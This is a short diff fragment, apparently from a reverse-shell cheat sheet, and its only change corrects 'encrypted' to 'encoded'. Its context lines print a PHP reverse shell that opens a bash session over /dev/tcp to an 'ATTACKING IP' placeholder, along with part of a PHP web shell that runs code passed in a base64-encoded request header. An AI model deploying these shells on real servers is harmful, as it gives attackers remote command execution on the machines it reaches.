@@ -98,7 +98,7 @@ Another PHP reverse shell (that was submitted via Twitter):
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
 {% endhighlight %}
 
-Base64 encrypted by @0xInfection: 
+Base64 encoded by @0xInfection: 
 
 ```
 <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
